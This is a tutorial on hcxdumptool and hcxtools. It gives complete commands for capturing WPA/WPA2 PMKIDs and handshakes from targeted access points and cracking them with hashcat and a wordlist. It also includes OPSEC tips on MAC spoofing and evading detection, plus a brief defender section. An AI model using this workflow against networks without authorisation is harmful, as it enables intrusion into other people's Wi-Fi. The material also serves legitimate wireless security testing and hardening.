# hcxdumptool / hcxtools — full tutorial

`hcxdumptool` captures Wi-Fi frames optimized for **PMKID** attacks (no connected client needed). `hcxtools` converts captures into hashcat-ready formats. Together they replaced the airodump+aireplay flow for modern WPA/WPA2 cracking.

## Install

```terminal
apt install hcxdumptool hcxtools
brew install hcxtools     # tools subset on macOS
```

Requires monitor + injection-capable adapter.

## hcxdumptool — capture

```terminal
sudo hcxdumptool -i wlan0mon -o capture.pcapng \
  --enable_status=1 \
  --filterlist_ap=targets.txt --filtermode=2
```

| Flag | Purpose |
|------|---------|
| `-i <iface>` | Interface (must already be in monitor mode) |
| `-o <file>` | pcapng output |
| `--enable_status=1` | Live console status |
| `--filterlist_ap=<file>` | BSSID filter (one MAC per line) |
| `--filtermode=2` | Only capture matching APs (1 = exclude, 2 = include) |
| `-c <ch>` | Stay on a channel |
| `-t <sec>` | Timeout |
| `-m <mac>` | Spoof MAC |
| `--rds=<n>` | Real Time Display Sort (1=oldest, 2=newest, 3=channel, 4=signal, 5=count) |
| `--bpf=<file>` | Berkeley packet filter |
| `--silent` | No deauthing/sending — purely passive |

## Workflow — PMKID attack

```terminal
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
# Wait — hcxdumptool sends ASSOCREQ; some APs leak PMKID in EAPOL M1.
# Stop with Ctrl-C when you see [+] PMKID lines.

# Convert capture to hashcat format:
hcxpcapngtool -o pmkid.hc22000 -E essidlist capture.pcapng

# Crack:
hashcat -m 22000 pmkid.hc22000 rockyou.txt -r rules/best64.rule
```

`-m 22000` covers PMKID **and** EAPOL handshakes — single mode for both.

## hcxtools — converters

| Tool | Purpose |
|------|---------|
| `hcxpcapngtool` | Convert pcapng → hc22000 / hccapx |
| `hcxhashtool` | Operate on hash files (filter by BSSID/ESSID) |
| `hcxessidtool` | Extract / filter ESSIDs |
| `hcxpsktool` | Generate WPA candidate keys from clues |
| `hcxwltool` | Generate cracking wordlists from ESSIDs |
| `hcxeiutool` | Information-element analyzer |

## Why PMKID > 4-way handshake

- **No client required**. PMKID is leaked in the very first EAPOL frame from APs that compute it eagerly. You associate, you get PMKID.
- **No deauth needed** → quieter, no client disruption.
- **PMF (802.11w)** doesn't help (it's about deauth, not PMKID).
- Some APs (modern Aruba, Cisco) don't leak PMKID — fall back to handshake capture.

## Common config — `hcxdumptool.conf`

```
filtermode=2
filterlist_ap=/etc/hcxdumptool/targets.txt
country=US
ignore_warning=1
```

## Bad output and fixes

| Symptom | Fix |
|---------|-----|
| Tool exits "no monitor mode interface" | `airmon-ng start wlan0` first |
| 0 PMKIDs after 30 minutes | AP doesn't leak PMKID — fall back to deauth-handshake |
| Cracking returns no result | Strong PSK; enrich with `hcxpsktool` ideas, or stop |
| `hcxpcapngtool` says "no hashes" | The capture didn't include EAPOL/PMKID — re-capture |
| Driver complains about channel hop | Some chipsets need explicit `-c`; pin a channel |

## Defender's perspective

- WPA2 PSK + leaky PMKID = trivially crackable if the password is on rockyou.
- **Disable PMKID generation** on the AP (vendor-specific knob).
- **Migrate to WPA3-SAE** — eliminates offline cracking entirely.
- WIDS detects abnormal ASSOCREQ patterns from a roaming "client" hitting many APs.

## OPSEC

- `hcxdumptool` defaults send minimal traffic — much quieter than aireplay-ng.
- Use `--silent` for fully-passive listening (PMKIDs from natural client associations).
- Spoofed MAC + low-power capture → minimal RF footprint.

## Related tools

- **aircrack-ng** — older 4-way-handshake flow.
- **bettercap wifi.recon** — modern menu-driven, includes PMKID.
- **wifite2** — wraps both for a TUI workflow.
- **wpaclean** — strips junk from caps before cracking.
